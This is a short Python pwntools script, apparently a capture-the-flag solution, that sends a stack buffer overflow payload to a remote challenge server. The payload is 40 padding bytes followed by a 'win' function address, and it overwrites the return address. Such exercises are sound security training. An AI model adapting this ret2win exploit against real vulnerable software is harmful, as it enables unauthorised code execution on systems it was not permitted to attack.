#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13448

def make_payload():
    
    win_addr = 0x401199

    payload = b'A'*40 + p64(win_addr)   #32bytes s, 8 of base pointer, then set return address to win function
    #print(payload)

    return payload

def main():

    server = remote(HOST, PORT)

    g = server.recvuntil(b'Please enter your name: ', timeout=1)
    print(g.decode())

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
